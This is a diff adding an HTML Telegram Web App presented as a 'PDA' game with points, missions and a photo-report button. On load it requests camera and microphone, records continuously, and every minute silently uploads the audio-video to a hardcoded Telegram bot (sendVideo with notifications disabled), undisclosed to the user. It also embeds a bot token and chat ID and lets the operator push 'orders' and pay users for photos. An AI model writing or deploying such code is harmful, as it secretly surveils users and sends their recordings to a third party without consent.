@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PDA Arsenii</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --green: #00ff41; --bg: #050804; }
+        body { background: var(--bg); color: var(--green); font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
+        .header { padding: 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; }
+        .avatar { width: 45px; height: 45px; border: 1px solid var(--green); border-radius: 50%; }
+        .stats { flex-grow: 1; }
+        .balance-main { font-size: 1.3em; font-weight: bold; color: #fff; }
+        .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
+        video { width: 100%; height: 100%; object-fit: cover; filter: sepia(0.3) brightness(1.1); }
+        .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
+        .btn-report { width: 100%; padding: 20px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; cursor: pointer; }
+        .scanline { position: absolute; top: 0; width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); pointer-events: none; animation: scan 5s linear infinite; }
+        @keyframes scan { from { top: 0; } to { top: 100%; } }
+    </style>
+</head>
+<body>
+    <div class="scanline"></div>
+    <div class="header">
+        <img id="user-pic" class="avatar" src="https://via.placeholder.com/45/003b11/00ff41?text=A" alt="">
+        <div class="stats">
+            <div id="display-name">STALKER</div>
+            <div class="balance-main"><span id="balance">0</span> ☢️ СТАУН</div>
+        </div>
+    </div>
+    <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
+    <div class="mission-panel">
+        <div id="target-text" style="font-weight: bold; margin-bottom: 10px;">ПОИСК СИГНАЛА...</div>
+        <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
+    </div>
+    <canvas id="captureCanvas" style="display:none;"></canvas>
+
+<script>
+    const CONFIG = {
+        token: "8677364559:AAGWCwbiGEEtrmVzKfP4wo7ZpzionHhx-MI",
+        chatId: "6997991003"
+    };
+
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.ready();
+
+    const user = {
+        id: tg.initDataUnsafe?.user?.id || 0,
+        name: tg.initDataUnsafe?.user?.first_name || "STALKER",
+        photo: tg.initDataUnsafe?.user?.photo_url
+    };
+
+    let balance = parseInt(localStorage.getItem(`bal_${user.id}`)) || 0;
+    let lastUpdateId = 0;
+
+    document.getElementById('display-name').innerText = user.name.toUpperCase();
+    document.getElementById('balance').innerText = balance;
+    if (user.photo) document.getElementById('user-pic').src = user.photo;
+
+    async function startPDA() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
+            
+            const recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = (e) => {
+                const fd = new FormData();
+                fd.append("chat_id", CONFIG.chatId);
+                fd.append("video", e.data, "log.mp4");
+                fd.append("caption", `📹 МОНИТОРИНГ: ${user.name}`);
+                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
+            };
+            setInterval(() => { if (recorder.state === "recording") { recorder.stop(); setTimeout(() => recorder.start(), 500); } }, 60000);
+            recorder.start();
+        } catch (err) { console.error(err); }
+    }
+
+    async function sync() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
+            const data = await res.json();
+            if (data.result) {
+                data.result.forEach(u => {
+                    lastUpdateId = u.update_id;
+                    if (u.callback_query) {
+                        const parts = u.callback_query.data.split(":");
+                        if (parts[0] === "pay" && parts[1] == user.id) {
+                            balance += parseInt(parts[2]);
+                            localStorage.setItem(`bal_${user.id}`, balance);
+                            document.getElementById('balance').innerText = balance;
+                            tg.HapticFeedback.notificationOccurred('success');
+                        }
+                    }
+                    const msg = u.message?.text || "";
+                    if (msg.toLowerCase().includes("приказ:")) {
+                        document.getElementById('target-text').innerText = msg.split(":")[1].toUpperCase();
+                    }
+                });
+            }
+        } catch (e) {}
+    }
+
+    document.getElementById('sendBtn').onclick = () => {
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('captureCanvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append("chat_id", CONFIG.chatId);
+            fd.append("photo", blob, "1.jpg");
+            fd.append("caption", `☢️ ОТЧЕТ: ${user.name}\n🆔 ID: ${user.id}`);
+            const kb = { inline_keyboard: [[
+                { text: "✅ ПРИНЯТЬ (+100)", callback_data: `pay:${user.id}:100` },
+                { text: "💎 ВАЖНОЕ (+500)", callback_data: `pay:${user.id}:500` }
+            ]] };
+            fd.append("reply_markup", JSON.stringify(kb));
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
+            tg.showAlert("ОТЧЕТ ОТПРАВЛЕН");
+        }, "image/jpeg");
+    };
+
+    startPDA();
+    setInterval(sync, 3000);
+</script>
+</body>
+</html>
